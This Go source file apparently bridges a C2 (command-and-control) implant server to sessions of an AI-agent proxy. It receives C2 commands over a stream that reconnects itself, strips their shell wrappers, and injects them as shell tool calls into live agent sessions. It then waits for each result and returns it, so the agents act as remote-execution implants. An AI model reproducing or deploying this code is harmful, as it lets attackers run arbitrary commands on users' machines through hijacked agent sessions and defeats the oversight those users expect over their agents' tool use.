package bridge

import (
	"fmt"
	"strings"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
	log "github.com/sirupsen/logrus"
)

// handleSpiteRecv receives commands from the C2 server via SpiteStream and
// dispatches them to the registered module handlers. Reconnects on stream errors.
func (b *Bridge) handleSpiteRecv() {
	log.Infof("[bridge] handleSpiteRecv started")
	ctx := b.moduleContext()
	for {
		req, err := b.spiteStream.Recv()
		if err != nil {
			log.Errorf("[bridge] SpiteStream recv error: %v", err)
			if b.ctx.Err() != nil {
				return // bridge is shutting down
			}
			b.reconnectSpiteStream()
			ctx = b.moduleContext() // refresh context with new stream
			continue
		}

		sessionID := req.GetSession().GetSessionId()
		spite := req.GetSpite()
		if spite == nil || sessionID == "" {
			continue
		}

		// Extract task ID so we can echo it back in the response.
		var taskID uint32
		if t := req.GetTask(); t != nil {
			taskID = t.GetTaskId()
		}

		log.Infof("[bridge] recv spite=%q taskID=%d session=%s", spite.Name, taskID, sessionID)

		// Ensure session listener is active for TaskManager fan-out.
		b.taskManager.StartSessionListener(sessionID)

		if !b.registry.Dispatch(ctx, sessionID, taskID, spite) {
			b.sendExecResponse(sessionID, taskID, fmt.Sprintf("module not found: %s", spite.Name))
		}
	}
}

// extractCommand builds the actual command from an ExecRequest.
// The server sends Path="/bin/sh" Args=["-c","whoami"] for shell commands.
// We strip the shell invocation and extract the real command.
func extractCommand(path string, args []string) string {
	// If path is a shell and args start with "-c", extract the actual command.
	if len(args) >= 2 && args[0] == "-c" {
		return strings.Join(args[1:], " ")
	}
	// If path is a shell with /c (cmd.exe /c whoami), extract actual command.
	if len(args) >= 2 && strings.EqualFold(args[0], "/c") {
		return strings.Join(args[1:], " ")
	}
	// Otherwise, treat as path + args.
	if len(args) > 0 {
		return path + " " + strings.Join(args, " ")
	}
	return path
}

// ---------------------------------------------------------------------------
// Shared module execution helpers
// ---------------------------------------------------------------------------

// DefaultSessionTimeout is the default timeout for waiting for a session.
const DefaultSessionTimeout = 30 * time.Second

// awaitTaskResult waits on the per-task channel for a result.
// The channel is dedicated to this task, so no taskID filtering is needed.
func awaitTaskResult(ch <-chan *sessions.CommandResult, _ uint32) (*sessions.CommandResult, bool) {
	result, ok := <-ch
	return result, ok
}

// acquireShellSession waits for the session and picks a shell tool.
// On failure it marks the task as failed and returns nil.
func acquireShellSession(ctx ModuleContext, sessionID string, taskID uint32, moduleName string) (*sessions.Session, string) {
	sess := ctx.WaitForSession(sessionID, DefaultSessionTimeout)
	if sess == nil {
		log.Warnf("[bridge] session %s not found for %s", sessionID, moduleName)
		ctx.Tasks.Fail(sessionID, taskID, "session not found")
		return nil, ""
	}
	// Re-attempt session listener now that the session exists.
	// The initial call in handleSpiteRecv may have failed if the session
	// was not yet created (e.g. after proxy restart).
	ctx.Tasks.StartSessionListener(sessionID)
	toolName := sessions.PickShellTool(sess)
	if toolName == "" {
		log.Warnf("[bridge] no shell tool found in session %s for %s", sessionID, moduleName)
		ctx.Tasks.Fail(sessionID, taskID, "no shell tool")
		return nil, ""
	}
	return sess, toolName
}

// enqueueAndAwait builds a PendingAction, enqueues it, binds it to the task,
// and waits for the result. Returns nil if any step fails.
func enqueueAndAwait(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, toolName, command string) *sessions.CommandResult {
	args := sessions.BuildCommandArguments(sess, toolName, command)
	cmdID := sessions.GenerateCommandID()
	action := &sessions.PendingAction{
		ID:        cmdID,
		TaskID:    taskID,
		Type:      sessions.ActionToolCall,
		ToolName:  toolName,
		Arguments: args,
		CreatedAt: time.Now(),
	}
	if !sessions.Global().EnqueueAction(sessionID, action) {
		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
		return nil
	}
	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)

	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
	if ch == nil {
		ctx.Tasks.Fail(sessionID, taskID, "await failed")
		return nil
	}
	result, ok := awaitTaskResult(ch, taskID)
	if !ok {
		ctx.Tasks.Fail(sessionID, taskID, "channel closed")
		return nil
	}
	return result
}

// enqueueToolAction builds a PendingAction, enqueues it, and binds to the task.
// Returns the command ID and true on success, or ("", false) on failure.
// Use this for modules that manage their own result channel (e.g. upload/download).
func enqueueToolAction(ctx ModuleContext, sessionID string, taskID uint32, toolName string, args map[string]any) (string, bool) {
	cmdID := sessions.GenerateCommandID()
	action := &sessions.PendingAction{
		ID:        cmdID,
		TaskID:    taskID,
		Type:      sessions.ActionToolCall,
		ToolName:  toolName,
		Arguments: args,
		CreatedAt: time.Now(),
	}
	if !sessions.Global().EnqueueAction(sessionID, action) {
		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
		return "", false
	}
	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
	return cmdID, true
}

// execSpite builds a simple ExecResponse Spite for error messages.
func execSpite(message string) *implantpb.Spite {
	return &implantpb.Spite{
		Name: consts.ModuleExecute,
		Body: &implantpb.Spite_ExecResponse{
			ExecResponse: &implantpb.ExecResponse{
				Stdout: []byte(message),
				End:    true,
			},
		},
	}
}
